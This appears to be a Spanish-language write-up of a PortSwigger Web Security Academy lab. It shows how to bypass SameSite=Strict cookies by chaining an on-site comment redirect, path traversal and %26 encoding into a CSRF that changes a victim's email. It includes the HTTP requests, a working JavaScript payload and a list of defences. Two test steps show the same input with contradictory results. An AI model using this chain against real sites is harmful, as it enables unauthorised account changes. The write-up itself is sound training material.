---
tags:
  - PortSwigger
  - CSRF
  - Web Security
  - Bug Bounty
  - SameSite
  - Path Traversal
dificultad: "⭐⭐⭐ Difícil"
tipo: "Lab - CSRF"
plataforma: "PortSwigger Web Security Academy"
técnicas:
  - CSRF (Cross-Site Request Forgery)
  - SameSite Strict bypass
  - Client-side redirect exploitation
  - Path traversal (../)
  - IDOR (Insecure Direct Object Reference)
  - URL parameter encoding
fecha: 2026-07-02
estado: "✅ Completada"
---

# 🔐 PortSwigger Lab: SameSite Strict bypass via client-side redirect

> [!info] Información del laboratorio
> - **Plataforma:** PortSwigger Web Security Academy
> - **Dificultad:** Difícil (más complejo que labs anteriores)
> - **Tipo:** CSRF (Cross-Site Request Forgery)
> - **Objetivo:** Cambiar email de la víctima bypasseando SameSite=Strict
> - **Credenciales:** `wiener:peter`
> - **Vulnerabilidad clave:** SameSite Strict + Client-side redirect mal configurado = CSRF

---

## 🗺️ Flujo del ataque

```
POST /my-account/change-email (SameSite=Strict) → No vulnerable directamente
→ Buscar redirect client-side mal configurado
→ Encontrar: /post/comment/confirmation?postId=X → redirige a /post/X
→ Path traversal: postId=../my-account/change-email
→ URL encoding: %26 para & en parámetros anidados
→ SameSite Strict ve como same-origin (mismo dominio)
→ Cookie enviada, email cambiado
→ Payload: document.location con URL armada
→ Enviar a víctima → Lab completado
```

---

## 1️⃣ Análisis inicial

### Login y cambio de email

```http
POST /my-account/change-email HTTP/2
Host: 0a200028047b8bf780f0a3ee00b90017.web-security-academy.net
Cookie: session=aVxXnK3YL2RcyrjEUDFMFrdK3Pof7Q58
Content-Type: application/x-www-form-urlencoded

email=user%40user.es&submit=1
```

> [!note] **Observación clave:** Sin token CSRF. Solo email + submit.

### SameSite Strict activo

Intentamos payload cross-site simple:

```html
<script>
  document.location = "https://target.com/my-account/change-email"
</script>
```

**Resultado:** El servidor trata la petición como cross-site.

SameSite=Strict bloquea envío de cookie en peticiones cross-site.

> [!warning] **SameSite Strict:** Bloquea cookie incluso en navegación (GET/POST/etc) desde otro sitio.

---

## 2️⃣ Búsqueda del bypass

### Problema

SameSite Strict bloquea cookie si petición viene de otro dominio.

### Solución

Encontrar un **redirect mal configurado** que:
1. Esté en el **mismo dominio**
2. Acepte URL como parámetro
3. Redirija a esa URL manteniendo el contexto "same-origin"

Cuando el navegador ve un redirect **desde** el mismo dominio, trata la petición resultante como same-origin → SameSite Strict permite cookie.

---

## 3️⃣ Descubrimiento del redirect

### Sistema de comentarios en blog

Navegando la plataforma, encontramos un blog con comentarios.

Al comentar, se muestra:

```
"Thank you for your comment!
Your comment has been submitted. You will be redirected momentarily."
```

Y luego redirige al post comentado.

### URL del redirect

```
https://target.com/post/comment/confirmation?postId=4
```

Este endpoint redirige a `/post/{postId}`.

> [!success] **Breakthrough:** Encontramos un redirect controlable en el mismo dominio.

---

## 4️⃣ Path Traversal en el redirect

### Prueba 1: Cambiar postId (IDOR)

```
?postId=2 → Redirige a /post/2
?postId=3 → Redirige a /post/3
```

Confirma que es controlable (IDOR).

### Prueba 2: Path traversal básico

Intentamos:

```
?postId=../my-account?id=wiener
```

**Resultado:** `Not Found`

**Razón:** El servidor construye la ruta como `/post/my-account?id=wiener`

El `../` suena a que debería navegar hacia arriba, pero el servidor inserta `post/` en la ruta.

### Prueba 3: Path traversal correcto

Corregimos la ruta:

```
?postId=../my-account?id=wiener
```

El servidor interpreta como: `/post/../my-account?id=wiener`

Normalization de ruta: `/post/.. = raíz` → `/my-account?id=wiener` ✅

> [!success] Path traversal funciona. Redirige a `/my-account?id=wiener`.

---

## 5️⃣ Inyección de endpoint de cambio de email

### Petición de cambio como GET

Convertimos POST a GET con Burp:

```http
GET /my-account/change-email?email=test%40user.es&submit=1
```

El servidor acepta GET (no requiere POST).

### Combinar con path traversal

```
?postId=../my-account/change-email?email=test%40user.es&submit=1
```

**Problema:** El `&` en URL anidada confunde al parser.

La URL se ve como:
```
/post/comment/confirmation?postId=../my-account/change-email?email=test@user.es&submit=1
```

El parser ve `postId=../my-account/change-email?email=test@user.es` y luego `&submit=1` como parámetro separado.

### Solución: URL Encoding

Encodear el `&` dentro del postId como `%26`:

```
?postId=../my-account/change-email?email=test%40user.es%26submit=1
```

Ahora se ve como un parámetro único para postId.

**Resultado:** `302 Found` → Redirige a `/my-account/change-email?email=test@user.es&submit=1`

> [!success] Email se cambia porque la petición proviene del mismo dominio → SameSite Strict permite cookie.

---

## 🎯 Por qué funciona el bypass

### Timing de SameSite Strict

1. **Atacante envía:** `document.location = "https://target.com/post/comment/confirmation?postId=..."`
2. **Navegador ve:** GET a same-origin (`target.com`) ✅
3. **SameSite Strict:** Permite cookie (es same-origin)
4. **Servidor recibe:** GET con postId=.. (path traversal)
5. **Servidor genera redirect:** a `/my-account/change-email?email=attacker@attacker.com&submit=1`
6. **Navegador sigue redirect:** Petición resultante también es same-origin ✅
7. **Cookie persiste** en seguimiento de redirect
8. **Email cambiado** con autenticación válida

> [!note] La clave: SameSite Strict solo bloquea si la petición **inicial** es cross-site. Los redirects **dentro del mismo dominio** son tratados como same-origin.

---

## 6️⃣ Payload final

```html
<script>
  document.location = "https://target.com/post/comment/confirmation?postId=../my-account/change-email?email=hacked%40user.es%26submit=1"
</script>
```

**Flujo:**

1. Víctima accede a payload desde otro sitio
2. Script ejecuta `document.location` (same-origin, GET)
3. SameSite Strict: ✅ permite cookie
4. Servidor recibe petición, ve postId con path traversal
5. Genera redirect a `/my-account/change-email?email=hacked@user.es&submit=1`
6. Navegador sigue redirect (aún same-origin)
7. Cookie persiste
8. Email cambiado a `hacked@user.es`

---

## 📊 Vulnerabilidades combinadas

Este lab combina múltiples fallos:

| Fallo | Impacto |
|-------|---------|
| **Redirect no sanitizado** | Acepta cualquier valor en postId |
| **Path traversal permitido** | `../` navega hacia arriba |
| **GET aceptado en POST endpoint** | Permite cambio vía GET |
| **SameSite Strict + Client-side redirect** | Redirect mismo-dominio bypasea protección |
| **Falta de CSRF token** | Sin validación de token |
| **IDOR** | postId=2,3,4... accesibles sin autorización |

---

## 7️⃣ Lecciones clave

> [!danger] **SameSite Strict no es protección suficiente si:**
> - Hay redirects controlables en el mismo dominio
> - El endpoint de destino acepta GET
> - No hay validación de token CSRF adicional

> [!tip] **Defensa correcta requiere:**
> - CSRF tokens en TODOS los endpoints sensibles
> - Validación de referer/origin headers
> - Sanitización de parámetros de redirect
> - Solo aceptar POST en endpoints que modifiquen datos

---

## 📚 Referencias

- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [MDN — SameSite Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [OWASP — Open Redirect](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
